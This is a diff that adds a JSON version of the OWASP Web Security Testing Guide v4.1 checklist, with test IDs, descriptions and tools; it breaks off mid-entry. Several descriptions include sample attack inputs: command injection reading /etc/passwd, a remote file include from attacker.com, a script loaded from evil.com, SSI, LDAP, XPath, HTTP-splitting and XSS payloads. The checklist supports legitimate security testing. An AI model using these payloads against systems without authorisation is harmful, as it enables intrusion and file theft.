@@ -1,0 +1,1050 @@
+{
+  "checklist": {
+    "title": "OWASP Web Security Testing Guide v4.1",
+    "categories": [
+      {
+        "category": "Information Gathering",
+        "tests": [
+          {
+            "id": "WSTG-INFO-01",
+            "test_name": "Conduct Search Engine Discovery Reconnaissance for Information Leakage",
+            "description": "Use a search engine to search for Network diagrams and Configurations, Credentials, Error message content.",
+            "tools": [
+              "Google Hacking",
+              "Sitedigger",
+              "Shodan",
+              "FOCA",
+              "Punkspider"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-02",
+            "test_name": "Fingerprint Web Server",
+            "description": "Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using \"HTTP header field ordering\" and \"Malformed requests test\".",
+            "tools": [
+              "Httprint",
+              "Httprecon",
+              "Desenmascarame"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-03",
+            "test_name": "Review Webserver Metafiles for Information Leakage",
+            "description": "Analyze robots.txt and identify <META> Tags from website.",
+            "tools": [
+              "Browser",
+              "curl",
+              "wget"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-04",
+            "test_name": "Enumerate Applications on Webserver",
+            "description": "Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers",
+            "tools": [
+              "Webhosting.info",
+              "dnsrecon",
+              "Nmap",
+              "fierce",
+              "Recon-ng",
+              "Intrigue"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-05",
+            "test_name": "Review Webpage Comments and Metadata for Information Leakage",
+            "description": "Find sensitive information from webpage comments and Metadata on source code.",
+            "tools": [
+              "Browser",
+              "curl",
+              "wget"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-06",
+            "test_name": "Identify application entry points",
+            "description": "Identify from hidden fields, parameters, methods HTTP header analysis",
+            "tools": [
+              "Burp proxy",
+              "ZAP",
+              "Tamper data"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-07",
+            "test_name": "Map execution paths through application",
+            "description": "Map the target application and understand the principal workflows.",
+            "tools": [
+              "Burp proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-08",
+            "test_name": "Fingerprint Web Application Framework",
+            "description": "Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.",
+            "tools": [
+              "Whatweb",
+              "BlindElephant",
+              "Wappalyzer"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-09",
+            "test_name": "Fingerprint Web Application",
+            "description": "Identify the web application and version to determine known vulnerabilities and the appropriate exploits.",
+            "tools": [
+              "Whatweb",
+              "BlindElephant",
+              "Wappalyzer",
+              "CMSmap"
+            ]
+          },
+          {
+            "id": "WSTG-INFO-10",
+            "test_name": "Map Application Architecture",
+            "description": "Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database",
+            "tools": [
+              "Browser",
+              "curl",
+              "wget"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Configuration and Deploy Management Testing",
+        "tests": [
+          {
+            "id": "WSTG-CONF-01",
+            "test_name": "Test Network/Infrastructure Configuration",
+            "description": "Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.",
+            "tools": [
+              "Nessus"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-02",
+            "test_name": "Test Application Platform Configuration",
+            "description": "Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.",
+            "tools": [
+              "Browser",
+              "Nikto"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-03",
+            "test_name": "Test File Extensions Handling for Sensitive Information",
+            "description": "Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)",
+            "tools": [
+              "Browser",
+              "Nikto"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-04",
+            "test_name": "Backup and Unreferenced Files for Sensitive Information",
+            "description": "Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename",
+            "tools": [
+              "Nessus",
+              "Nikto",
+              "Wikto"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-05",
+            "test_name": "Enumerate Infrastructure and Application Admin Interfaces",
+            "description": "Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)",
+            "tools": [
+              "Burp Proxy",
+              "dirb",
+              "Dirbuster",
+              "fuzzdb",
+              "Tilde Scanner"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-06",
+            "test_name": "Test HTTP Methods",
+            "description": "Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST",
+            "tools": [
+              "netcat",
+              "curl"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-07",
+            "test_name": "Test HTTP Strict Transport Security",
+            "description": "Identify HSTS header on Web server through HTTP response header.  curl -s -D- https://domain.com/ | grep Strict",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "curl"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-08",
+            "test_name": "Test RIA cross domain policy",
+            "description": "Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Nikto"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-09",
+            "test_name": "Test File Permission",
+            "description": "In Linux, use ls command to check the file permissions. Alternatively, namei can also be used to recursively list file permissions",
+            "tools": [
+              "Windows AccessEnum",
+              "Windows AccessChk",
+              "Linux namei"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-10",
+            "test_name": "Test for Subdomain Takeover",
+            "description": "The first step is to enumerate the victim DNS servers and resource records. There are multiple ways to accomplish this task, for example DNS enumeration using a list of common subdomains dictionary, DNS brute force or using web search engines and other OSINT data sources",
+            "tools": [
+              "amass",
+              "dig",
+              "recon-ng",
+              "the harvester"
+            ]
+          },
+          {
+            "id": "WSTG-CONF-11",
+            "test_name": "Test Cloud Storage",
+            "description": "Assess whether Cloud Storage Service's access control configuration is properly in place.",
+            "tools": [
+              "awscli"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Identity Management Testing",
+        "tests": [
+          {
+            "id": "WSTG-IDNT-01",
+            "test_name": "Test Role Definitions",
+            "description": "Validate the system roles defined within the application by creating permission matrix.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-IDNT-02",
+            "test_name": "Test User Registration Process",
+            "description": "Verify that the identity requirements for user registration are aligned with business and security requirements:",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-IDNT-03",
+            "test_name": "Test Account Provisioning Process",
+            "description": "Determine which roles are able to provision users and what sort of accounts they can provision.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-IDNT-04",
+            "test_name": "Testing for Account Enumeration and Guessable User Account",
+            "description": "Generic login error statement check, return codes/parameter values, enumerate all possible valid userids (Login system, Forgot password)",
+            "tools": [
+              "Browser",
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-IDNT-05",
+            "test_name": "Testing for Weak or unenforced username policy",
+            "description": "User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.",
+            "tools": [
+              "Browser",
+              "Burp Proxy",
+              "ZAP"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Authentication Testing",
+        "tests": [
+          {
+            "id": "WSTG-ATHN-01",
+            "test_name": "Testing for Credentials Transported over an Encrypted Channel",
+            "description": "Check referrer whether its HTTP or HTTPs. Sending data through HTTP and HTTPS.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-02",
+            "test_name": "Testing for default credentials",
+            "description": "Testing for default credentials of common applications, Testing for default password of new accounts.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Hydra"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-03",
+            "test_name": "Testing for Weak lock out mechanism",
+            "description": "Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.",
+            "tools": [
+              "Browser"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-04",
+            "test_name": "Testing for bypassing authentication schema",
+            "description": "Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-05",
+            "test_name": "Test remember password functionality",
+            "description": "Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-06",
+            "test_name": "Testing for Browser cache weakness",
+            "description": "Check browser history issue by clicking \"Back\" button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Firefox add-on CacheViewer2"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-07",
+            "test_name": "Testing for Weak password policy",
+            "description": "Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of passwords.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Hydra"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-08",
+            "test_name": "Testing for Weak security question/answer",
+            "description": "Testing for weak pre-generated questions, Testing for weak self-generated question, Testing for brute-forcible answers (Unlimited attempts?)",
+            "tools": [
+              "Browser"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-09",
+            "test_name": "Testing for weak password change or reset functionalities",
+            "description": "Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?",
+            "tools": [
+              "Browser",
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ATHN-10",
+            "test_name": "Testing for Weaker authentication in alternative channel",
+            "description": "Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)",
+            "tools": [
+              "Browser"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Authorization Testing",
+        "tests": [
+          {
+            "id": "WSTG-ATHZ-01",
+            "test_name": "Testing Directory Traversal - File Include",
+            "description": "dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Wfuzz"
+            ]
+          },
+          {
+            "id": "WSTG-ATHZ-02",
+            "test_name": "Testing for bypassing authorization schema",
+            "description": "Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)",
+            "tools": [
+              "Burp Proxy (Autorize)",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ATHZ-03",
+            "test_name": "Testing for Privilege Escalation",
+            "description": "Testing for role/privilege manipulate the values of hidden variables. Change some param groupid=2 to groupid=1",
+            "tools": [
+              "Burp Proxy (Autorize)",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ATHZ-04",
+            "test_name": "Testing for Insecure Direct Object References",
+            "description": "Force changing parameter value (?invoice=123 -> ?invoice=456)",
+            "tools": [
+              "Burp Proxy (Autorize)",
+              "ZAP"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Session Management Testing",
+        "tests": [
+          {
+            "id": "WSTG-SESS-01",
+            "test_name": "Testing for Bypassing Session Management Schema",
+            "description": "SessionID analysis prediction, unencrypted cookie transport, brute-force.",
+            "tools": [
+              "Burp Proxy",
+              "ForceSSL",
+              "ZAP",
+              "CookieDigger"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-02",
+            "test_name": "Testing for Cookies attributes",
+            "description": "Check HTTPOnly and Secure flag, expiration, inspect for sensitive data.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-03",
+            "test_name": "Testing for Session Fixation",
+            "description": "The application doesn't renew the cookie after a successfully user authentication.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-04",
+            "test_name": "Testing for Exposed Session Variables",
+            "description": "Encryption & Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-05",
+            "test_name": "Testing for Cross Site Request Forgery",
+            "description": "URL analysis, Direct access to functions without any token.",
+            "tools": [
+              "Burp Proxy (csrf_token_detect)",
+              "burpy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-06",
+            "test_name": "Testing for logout functionality",
+            "description": "Check reuse session after logout both server-side and SSO.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-07",
+            "test_name": "Test Session Timeout",
+            "description": "Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-SESS-08",
+            "test_name": "Testing for Session puzzling",
+            "description": "The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Data Validation Testing",
+        "tests": [
+          {
+            "id": "WSTG-INPV-01",
+            "test_name": "Testing for Reflected Cross Site Scripting",
+            "description": "Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Xenotix XSS"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-02",
+            "test_name": "Testing for Stored Cross Site Scripting",
+            "description": "Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "BeEF",
+              "XSS Proxy"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-03",
+            "test_name": "Testing for HTTP Verb Tampering",
+            "description": "Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.",
+            "tools": [
+              "netcat"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-04",
+            "test_name": "Testing for HTTP Parameter pollution",
+            "description": "Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP",
+            "tools": [
+              "ZAP",
+              "HPP Finder (Chrome Plugin)"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-05",
+            "test_name": "Testing for SQL Injection",
+            "description": "Union, Boolean, Error based, Out-of-band, Time delay.",
+            "tools": [
+              "Burp Proxy (SQLipy)",
+              "SQLMap",
+              "Pangolin",
+              "Seclists (FuzzDB)"
+            ],
+            "sub_tests": [
+              {
+                "sub_test": "Oracle Testing",
+                "description": "Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection",
+                "tools": [
+                  "Orascan",
+                  "SQLInjector"
+                ]
+              },
+              {
+                "sub_test": "MySQL Testing",
+                "description": "Identify MySQL version, Single quote, Information_schema, Read/Write file.",
+                "tools": [
+                  "SQLMap",
+                  "Mysqloit",
+                  "Power Injector"
+                ]
+              },
+              {
+                "sub_test": "SQL Server Testing",
+                "description": "Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)",
+                "tools": [
+                  "SQLMap",
+                  "SQLninja",
+                  "Power Injector"
+                ]
+              },
+              {
+                "sub_test": "Testing PostgreSQL",
+                "description": "Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)",
+                "tools": [
+                  "SQLMap"
+                ]
+              },
+              {
+                "sub_test": "MS Access Testing",
+                "description": "Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.",
+                "tools": [
+                  "SQLMap"
+                ]
+              },
+              {
+                "sub_test": "Testing for NoSQL injection",
+                "description": "Identify NoSQL databases, Pass special characters (' \" \\ ; { } ), Attack with reserved variable name, operator.",
+                "tools": [
+                  "NoSQLMap"
+                ]
+              },
+              {
+                "sub_test": "Testing for ORM Injection",
+                "description": "Testing ORM injection is identical to SQL injection testing",
+                "tools": [
+                  "Hibernate",
+                  "Nhibernate"
+                ]
+              }
+            ]
+          },
+          {
+            "id": "WSTG-INPV-06",
+            "test_name": "Testing for LDAP Injection",
+            "description": "/ldapsearch?user=* user=*user=*)(uid=*))(|(uid=* pass=password",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-07",
+            "test_name": "Testing for XML Injection",
+            "description": "Check with XML Meta Characters ', \" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Wfuzz"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-08",
+            "test_name": "Testing for SSI Injection",
+            "description": "• Presense of .shtml extension • Check for these characters < ! # = / . \" - > and [a-zA-Z0-9] • include String = <!--#include virtual=\"/etc/passwd\" -->",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-09",
+            "test_name": "Testing for XPath Injection",
+            "description": "Check for XML error enumeration by supplying a single quote (') Username: ‘ or ‘1’ = ‘1 Password: ‘ or ‘1’ = ‘1",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-10",
+            "test_name": "IMAP/SMTP Injection",
+            "description": "• Identifying vulnerable parameters with special characters (i.e.: \\, ‘, “, @, #, !, |) • Understanding the data flow and deployment structure of the client • IMAP/SMTP command injection (Header, Body, Footer)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-11",
+            "test_name": "Testing for Code Injection",
+            "description": "Enter OS commands in the input field. ?arg=1; system('id')",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Liffy",
+              "Panoptic"
+            ],
+            "sub_tests": [
+              {
+                "sub_test": "Testing for Local File Inclusion",
+                "description": "LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)",
+                "tools": [
+                  "Burp Proxy",
+                  "fimap",
+                  "Liffy"
+                ]
+              },
+              {
+                "sub_test": "Testing for Remote File Inclusion",
+                "description": "RFI from malicious URL ?page.php?file=http://attacker.com/malicious_page",
+                "tools": [
+                  "Burp Proxy",
+                  "fimap",
+                  "Liffy"
+                ]
+              }
+            ]
+          },
+          {
+            "id": "WSTG-INPV-12",
+            "test_name": "Testing for Command Injection",
+            "description": "Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server. %3Bcat%20/etc/passwd test.pdf+|+Dir C:\\",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Commix"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-13",
+            "test_name": "Testing for Buffer overflow",
+            "description": "• Testing for heap overflow vulnerability • Testing for stack overflow vulnerability • Testing for format string vulnerability",
+            "tools": [
+              "Immunity Canvas",
+              "Spike",
+              "MSF",
+              "Nessus"
+            ],
+            "sub_tests": [
+              {
+                "sub_test": "Testing for Heap overflow",
+                "description": null,
+                "tools": []
+              },
+              {
+                "sub_test": "Testing for Stack overflow",
+                "description": null,
+                "tools": []
+              },
+              {
+                "sub_test": "Testing for Format string",
+                "description": null,
+                "tools": []
+              }
+            ]
+          },
+          {
+            "id": "WSTG-INPV-14",
+            "test_name": "Testing for incubated vulnerabilities",
+            "description": "File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)",
+            "tools": [
+              "Burp Proxy",
+              "BeEF",
+              "MSF"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-15",
+            "test_name": "Testing for HTTP Splitting/Smuggling",
+            "description": "param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "netcat"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-16",
+            "test_name": "Testing for HTTP Incoming Requests",
+            "description": "Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests. Monitor HTTP traffic without changes of end user Browser proxy or client-side application.",
+            "tools": [
+              "fiddler",
+              "tcpdump",
+              "charles web debugging proxy"
+            ]
+          },
+          {
+            "id": "WSTG-INPV-17",
+            "test_name": "Testing for Host Header Injection",
+            "description": "initial testing is as simple as supplying another domain (i.e. attacker.com) into the Host header field. It is how the web server processes the header value that dictates the impact. The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.",
+            "tools": []
+          },
+          {
+            "id": "WSTG-INPV-18",
+            "test_name": "Testing for Server-side Template Injection",
+            "description": "SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name). In both cases the testing methodology has the following steps:",
+            "tools": [
+              "tplmap",
+              "backslash powered scanner (burp suite injection)"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Error Handling",
+        "tests": [
+          {
+            "id": "WSTG-ERRH-01",
+            "test_name": "Analysis of Error Codes",
+            "description": "Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-ERRH-02",
+            "test_name": "Analysis of Stack Traces",
+            "description": "• Invalid Input / Empty inputs • Input that contains non alphanumeric characters or query syn tax • Access to internal pages without authentication • Bypassing application flow",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Cryptography",
+        "tests": [
+          {
+            "id": "WSTG-CRYP-01",
+            "test_name": "Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection",
+            "description": "Identify SSL service, Idectify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)",
+            "tools": [
+              "testssl.sh",
+              "SSL Breacher"
+            ]
+          },
+          {
+            "id": "WSTG-CRYP-02",
+            "test_name": "Testing for Padding Oracle",
+            "description": "Compare the responses in three different states: • Cipher text gets decrypted, resulting data is correct. • Cipher text gets decrypted, resulting data is garbled and causes some exception or error handling in the application logic. • Cipher text decryption fails due to padding errors.",
+            "tools": [
+              "PadBuster",
+              "Poracle",
+              "python-paddingoracle",
+              "POET"
+            ]
+          },
+          {
+            "id": "WSTG-CRYP-03",
+            "test_name": "Testing for Sensitive information sent via unencrypted channels",
+            "description": "Check sensitive data during the transmission: • Information used in authentication (e.g. Credentials, PINs, Session identifiers, Tokens, Cookies…) • Information protected by laws, regulations or specific organizational policy (e.g. Credit Cards, Customers data)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP",
+              "Curl"
+            ]
+          },
+          {
+            "id": "WSTG-CRYP-04",
+            "test_name": "Testing for Weak Encryption",
+            "description": "Incorrect uses of encryption algorithm may result in sensitive data exposure, key leakage, broken authentication, insecure session and spoofing attack. There are some encryption or hash algorithm is known to be weak and not suggested to be used anymore such as MD5 and RC4.",
+            "tools": [
+              "Nessus"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Business logic Testing",
+        "tests": [
+          {
+            "id": "WSTG-BUSL-01",
+            "test_name": "Test Business Logic Data Validation",
+            "description": "• Looking for data entry points or hand off points between systems or software. • Once found try to insert logically invalid data into the application/system.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-02",
+            "test_name": "Test Ability to Forge Requests",
+            "description": "• Looking for guessable, predictable or hidden functionality of fields. • Once found try to insert logically valid data into the application/system allowing the user go through the application/system against the normal busineess logic workflow.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-03",
+            "test_name": "Test Integrity Checks",
+            "description": "•Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information. • For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component. • Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the busines logic workflow.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-04",
+            "test_name": "Test for Process Timing",
+            "description": "• Looking for application/system functionality that may be impacted by time. Such as execution time or actions that help users predict a future outcome or allow one to circumvent any part of the business logic or workflow. For example, not completing transactions in an expected time. • Develop and execute the mis-use cases ensuring that attackers can not gain an advantage based on any timing.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-05",
+            "test_name": "Test Number of Times a Function Can be Used Limits",
+            "description": "• Looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow. • For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-06",
+            "test_name": "Testing for the Circumvention of Work Flows",
+            "description": "• Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow. • For each method develop a misuse case and try to circumvent or perform an action that is \"not acceptable\" per the the business logic workflow.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-07",
+            "test_name": "Test Defenses Against Application Mis-use",
+            "description": "Measures that might indicate the application has in-built self-defense: • Changed responses • Blocked requests • Actions that log a user out or lock their account",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-08",
+            "test_name": "Test Upload of Unexpected File Types",
+            "description": "• Review the project documentation and perform some exploratory testing looking for file types that should be \"unsupported\" by the application/system. • Try to upload these “unsupported” files an verify that it are properly rejected. • If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.  PS. file.phtml, shell.phPWND, SHELL~1.PHP",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-BUSL-09",
+            "test_name": "Test Upload of Malicious Files",
+            "description": "• Develop or acquire a known “malicious” file. • Try to upload the malicious file to the application/system and verify that it is correctly rejected. • If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          }
+        ]
+      },
+      {
+        "category": "Client Side Testing",
+        "tests": [
+          {
+            "id": "WSTG-CLNT-01",
+            "test_name": "Testing for DOM based Cross Site Scripting",
+            "description": "Test for the user inputs obtained from client-side JavaScript Objects",
+            "tools": [
+              "Burp Proxy",
+              "DOMinator"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-02",
+            "test_name": "Testing for JavaScript Execution",
+            "description": "Inject JavaScript code: www.victim.com/?javascript:alert(1)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-03",
+            "test_name": "Testing for HTML Injection",
+            "description": "Send malicious HTML code: ?user=<img%20src='aaa'%20onerror=alert(1)>",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-04",
+            "test_name": "Testing for Client Side URL Redirect",
+            "description": "Modify untrusted URL input to a malicious site: (Open Redirect) ?redirect=www.fake-target.site",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-05",
+            "test_name": "Testing for CSS Injection",
+            "description": "Inject code in the CSS context : •  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12]) •  www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-06",
+            "test_name": "Testing for Client Side Resource Manipulation",
+            "description": "External JavaScript could be easily injected in the trusted web site www.victim.com/#http://evil.com/js.js",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-07",
+            "test_name": "Test Cross Origin Resource Sharing",
+            "description": "Check the HTTP headers in order to understand how CORS is used (Origin Header)",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-08",
+            "test_name": "Testing for Cross Site Flashing",
+            "description": "Decompile, Undefined variables, Unsafe methods, Include malicious SWF (http://victim/file.swf?lang=http://evil",
+            "tools": [
+              "FlashBang",
+              "Flare",
+              "Flasm",
+              "SWFScan",
+              "SWF Intruder"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-09",
+            "test_name": "Testing for Clickjacking",
+            "description": "Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.",
+            "tools": [
+              "Burp Proxy",
+              "ClickjackingTool"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-10",
+            "test_name": "Testing WebSockets",
+            "description": "Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.Use Google Chrome's Developer Tools to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization",
+            "tools": [
+              "Burp Proxy",
+              "Chrome",
+              "ZAP",
+              "WebSocket Client"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-11",
+            "test_name": "Test Web Messaging",
